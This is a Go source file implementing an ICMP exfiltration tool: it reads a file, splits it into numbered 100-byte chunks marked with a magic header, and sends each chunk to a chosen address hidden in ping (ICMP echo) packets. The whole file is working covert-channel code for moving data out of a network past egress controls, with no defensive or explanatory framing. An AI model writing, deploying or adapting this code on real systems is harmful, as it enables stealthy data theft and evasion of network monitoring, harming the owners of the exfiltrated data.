package main

import (
	"encoding/binary"
	"net"
	"os"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

type ICMPExfil struct {
	FileName string
	Addr     string
}

func NewICMPExfil(fileName string, addr string) *ICMPExfil {
	return &ICMPExfil{
		FileName: fileName,
		Addr:     addr,
	}
}

func (i *ICMPExfil) Exfiltrate() error {
	file, err := ReadFromBinaryFile(i.FileName)
	if err != nil {
		return err
	}

	chunks := i.chunkData(file, 100)
	totalChunks := uint32(len(chunks))

	initialData := make([]byte, 12)
	binary.BigEndian.PutUint32(initialData, DeadBeef)
	binary.BigEndian.PutUint32(initialData[4:], totalChunks)
	binary.BigEndian.PutUint32(initialData[8:], 1)

	for chunkNum, chunk := range chunks {
		chunkData := make([]byte, len(chunk)+12)
		copy(chunkData, initialData)
		copy(chunkData[12:], chunk)

		binary.BigEndian.PutUint32(chunkData[8:], uint32(chunkNum+1))

		err := i.sendICMP(chunkData)
		if err != nil {
			return err
		}
	}

	return nil
}

func (i *ICMPExfil) chunkData(bytes []byte, size int) [][]byte {
	chunks := make([][]byte, 0)
	new_size := 0
	for i := 0; i < len(bytes); i += size {
		if size+i > len(bytes) {
			new_size = len(bytes) - i
		} else {
			new_size = 100
		}
		chunks = append(chunks, bytes[i:i+new_size])
	}
	return chunks
}

func (i *ICMPExfil) sendICMP(data []byte) error {
	ipAddr, err := net.ResolveIPAddr("ip4", i.Addr)
	if err != nil {
		return err
	}

	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return err
	}
	defer conn.Close()

	msg := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{
			ID:   os.Getpid() & 0xffff,
			Seq:  1,
			Data: data,
		},
	}

	msgBytes, err := msg.Marshal(nil)
	if err != nil {
		return err
	}

	_, err = conn.WriteTo(msgBytes, ipAddr)
	if err != nil {
		return err
	}

	return nil
}
